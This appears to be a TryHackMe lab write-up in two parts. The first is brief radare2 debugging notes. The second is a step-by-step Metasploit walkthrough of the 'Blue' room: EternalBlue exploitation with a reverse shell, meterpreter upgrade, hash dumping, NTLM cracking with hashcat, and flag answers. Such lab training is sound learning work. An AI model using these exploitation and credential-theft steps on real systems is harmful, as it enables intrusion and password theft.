<br/><br/>
<br/><br/>
Flags will be **BOLD**
<br/><br/>
<br/><br/>
<br/><br/>


For this challenge we will play with some coding

First lets connect!

"ssh tryhackme@*IP*

Password
"reismyfavl33t"

While it does not say it we need to change folders

"cd introduction" will put us in the right place

Now lets run some basic commands

"./intro" will show a bit of text

It asks if I want to print 333.5k characters (I definitely wont read it all)

at this stage it seems to want us to type 

"aa"

This popped up with a "Analyze all flags staring with sym. entry0 (aa)

It now wants us to run "e asm.syntax=att"

It shows us "?" shows some information about commands

"a?" shows that the next command af1 analyzes functionsa?

it does not show anything about af1 however

"af1" makes me realize something is borked... lets run it back!

"exit"

"y"

"y"

"r2 -d intro"

now asks if we wanna play some chess!

I now realized that most of this is theory and reading for now

"ls"

we are now in task 4 after our reading

we need to get to the if-statment folder

"cd ./if-statement/"

"r2 -d if1"

lets run their other commands

"aaa"

"af1"

"pdf @main"

This did not work...

lets try again!

"exit"

"y"

"y"

"r2 -d if1"

"aaa"

"af1"

"pdf @main"

Now we are in the correct spot!

"db 0x55ae52836612"

"Cannot place a breakpoint on 0x55ae52836612 unmapped memory.See e? dbg.bpinmaps"

thats... not right is it?

Oh wait! our hex addresses are different like the instructions said they might be!

"db 0x557d0d604612"

"db 0x557d0d604618"

"dc"

"dr" will show the value of the registers"

"px @rbp-0x4"










































I used this page to help learn more Nmap commands maybe you can to!
<br/><br/>
https://www.stationx.net/nmap-cheat-sheet/
<br/><br/>
Start the machine and the connect using your Open VPN
<br/><br/>
Run "nmap *IP of Active machine*" to scan 1000 common ports
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-Port Count.PNG">
<br/><br/>
We now have the first Flag!
<br/>
**"3"** is the number of open ports under 1000
<br/><br/>
Now we need to see what the machine is vulnerable to
<br/><br/>
lets run a quick command on those 3 ports
<br/><br/>
"nmap --script vuln -p *IP of Active machine* -v"
<br/><br/>
"--script vuln" will load in scripts to scan on the target IP/Ports
<br/>
"-p 135-445" will scan ports 135-445 with those vulnerability script
<br/>
"-v" increases the verbosity *adds more words* (you can use -vv for a greater effect)
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-MS17.PNG">
<br/><br/>
Now we have our final flag of task 1!
<br/><br/>
in our command we see **"ms17-010"** it even shows the disclosure date right below the red box
<br/><br/>
<br/><br/>
**TASK 2**
<br/><br/>
We will need to use Metasploit for this portion
<br/><br/>
Lets run "msfdb init" (MetaSploit Framework DataBase Initialize)
<br/><br/>
Now lets run "msfconsole"
<br/><br/>
Once we get our ASCII art we can run the next command
<br/><br/>
"search ms17-010"
<br/><br/>
This will show several options but since weknow we have a Windows machine we can try those first
<br/><br/>
"use 2" will choose the second choice
<br/>
<img src="/images/TryHackMe/Blue/Task 2-2.PNG">
<br/>
**"exploit/windows/smb/ms17_010_eternalblue"** is the answer for the full path of the code
<br/><br/>
Next up "Set RHOSTS *IP of Active machine*"
<br/>
<img src="/images/TryHackMe/Blue/Task 2-3.PNG">
<br/>
**"RHOSTS"** is the answer for the name of the value
<br/><br/>
We will also need to set the LHOSTS to tun0
<br/><br/>
"set LHOST tun0" due to using a vpn
<br/><br/>
"show options" will show all the required areas are now done
<br/><br/>
The room wants us to use "set payload windows/x64/shell/reverse_tcp" before we do the next step
<br/><br/>
all we have to do now is type "run"
<br/><br/>
No we are in! (You may need to press enter) 
<br/><br/>
**TASK 3**
<br/><br/>
Type "whoami" to see if we are now connected as "nt authority\system"
<br/><br/>
place this session in the background with "ctrl+Z"
<br/><br/>
now we need to search for shell_to_meterpreter
<br/><br/>
"search shell_to_meterpreter"
<br/><br/>
We now see the answer to a question!
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 3-1.PNG">
"**post/multi/manage/shell_to_meterpreter**"
<br/><br/>
Now lets use what we found
<br/><br/>
"use post/multi/manage/shell_to_meterpreter"
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 3-2.PNG">
use "show options" and we see we need to change "**Session**"
<br/><br/>
now we need to set our session
<br/><br/>
use "sessions" to find your sessions #
<br/><br/>
"set session *Session #*"
<br/><br/>
once that is done type "sessions" and it should have new information under "Information"
<br/><br/>
type "session *session #*
<br/><br/>
now it should show "meterpreter" on the current line
<br/><br/>
try using "shell" and then "whoami" to see if we are system
<br/><br/>
press "ctrl+z" to get back to meterpreter
<br/><br/>
Now lets look at processes w/ "ps"
<br/><br/>
now we need to try and migrate to one of these processes
<br/><br/>
I used "migrate 2536" to go to svchost.exe but your masy be different
<br/><br/>
**TASK 4**
<br/><br/>
Now we get to play with hashes!
<br/><br/>
"hashdump" will give us 3 hashes
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 4-1.PNG">
"**Jon**" is the answer to 1 question of Task 4
<br/><br/>
if you google "windows password hash format" you will see they are either LM or NTLM
<br/><br/>
Lets try to crack all 3 with hashcat!
<br/><br/>
Lets save them as a document named "Bluehashes.txt"
<br/><br/>
you will need world lists for hashcat. I already had a "rockyou" list so I will use that
<br/><br/>
for hashcat we will use "sudo hashcat -a 0 -m 1000 Bluehashes.txt rockyou.wordlist --force --username --show > Hashed.txt"
<br/><br/>
-a is for the attack mode 0, -m 1000 is for the NTLM hash format, --force is for if you do not have a Intel OpenCL runtime, --username ignores the username, > Hashed.txt names a file with the output
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 4-2.PNG">
<br/>
In that new file at the end of Jons line is "**alqfna22**"
<br/><br/>
**TASK 5**
<br/><br/>
Now we need to find flags
<br/><br/>
"Flag1? This flag can be found at the system root."
<br/><br/>
"ls C:\\ will list the root
<br/><br/>
we now see "flag1.txt"
<br/><br/>
lets cat it!
<br/><br/>
"cat flag1.txt"
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 5-1.PNG">
"**flag{access_the_machine}**"
<br/><br/>
The second flag is where passwords are stored which would be "C:/windows/system32/config"
<br/><br/>
"cd C:/Windows/System32/Config"
<br/><br/>
"dir"
<br/><br/>
Will show us there is a "flag2.txt"
<br/><br/>
<img src="/images/TryHackMe/Blue/Task 5-2.PNG">
<br/>
"**flag{sam_database_elevated_access}**"
<br/>
We now have 2 of the 3 flags!
<br/><br/>
For the final flag we don't have much context so lets search instead
<br/><br/>
"search -f flag*.txt" should work
<br/><br/>
We now see a flag3.txt in Jons documents 
<br/>
<img src="/images/TryHackMe/Blue/Task 5-3.PNG">
<br/>
"**flag{admin_documents_can_be_valuable}**"
<br/><br/>
We have finally succeeded in the room!
